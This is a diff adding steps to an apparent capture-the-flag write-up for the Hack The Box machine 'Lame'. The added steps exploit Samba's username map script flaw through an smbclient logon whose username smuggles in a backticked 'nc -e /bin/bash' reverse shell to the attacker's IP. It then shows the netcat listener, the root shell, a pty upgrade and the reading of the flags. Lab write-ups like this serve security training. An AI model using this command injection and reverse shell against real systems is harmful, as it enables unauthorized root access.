@@ -206,6 +206,104 @@ Copied to: /home/kali/16320.rb
 username = "/=`nohup " + payload.encoded + "`"
 ```
 
-+ `smbclient //10.10.10.3/tmp -N`
++ `smbclient //10.10.10.3/tmp -N` and 'nc -lnvp 4444'
+```
+logon "./=`nohup nc -e /bin/bash 10.10.10.3 4444`"
+```
+```
+└─$ smbclient //10.10.10.3/tmp -N
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ?
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+more           mput           newer          notify         open           
+posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
+posix_unlink   posix_whoami   print          prompt         put            
+pwd            q              queue          quit           readlink       
+rd             recurse        reget          rename         reput          
+rm             rmdir          showacls       setea          setmode        
+scopy          stat           symlink        tar            tarmode        
+timeout        translate      unlock         volume         vuid           
+wdel           logon          listconnect    showconnect    tcon           
+tdis           tid            utimes         logoff         ..             
+!              
+smb: \> logon "./=`nohup nc -e /bin/bash 10.10.10.3 4444`"
+Password: 
+session setup failed: NT_STATUS_LOGON_FAILURE
+smb: \> 
+
+```
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3bb48c07-e037-481d-b497-24043512c50c)
+<br>
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0b37ab1a-b932-4e98-b239-62c50cf1977c)
+
++ Change the ip to the tunnel ip address.
+```
+└─$ smbclient //10.10.10.3/tmp -N
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ?
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+more           mput           newer          notify         open           
+posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
+posix_unlink   posix_whoami   print          prompt         put            
+pwd            q              queue          quit           readlink       
+rd             recurse        reget          rename         reput          
+rm             rmdir          showacls       setea          setmode        
+scopy          stat           symlink        tar            tarmode        
+timeout        translate      unlock         volume         vuid           
+wdel           logon          listconnect    showconnect    tcon           
+tdis           tid            utimes         logoff         ..             
+!              
+smb: \> logon "./=`nohup nc -e /bin/bash 10.10.10.3 4444`"
+Password: 
+session setup failed: NT_STATUS_LOGON_FAILURE
+smb: \> logon "./=`nohup nc -e /bin/bash 10.10.XX.XX 4444`"
+Password: 
+```
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4fdc051b-97ca-4198-a4f3-091a1f5a7cf6)
+<br>
+<br>
+Got the shell as root.
+`nc -lnvp 4444`
+Stable shell.
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+```
+└─$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.3] 57528
+id 
+uid=0(root) gid=0(root)
+whoami
+root
+uname -a
+Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+python -c 'import pty; pty.spawn("/bin/bash")'
+root@lame:/# cat /home/makis/user.txt
+cat /home/makis/user.txt
+User-Flag
+root@lame:/# cat /root/root.txt
+cat /root/root.txt
+Root-Flag
+root@lame:/# 
+
+```
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1a5a2e60-d47a-4e55-8509-dcf184ef2cfc)
+
+
 
 
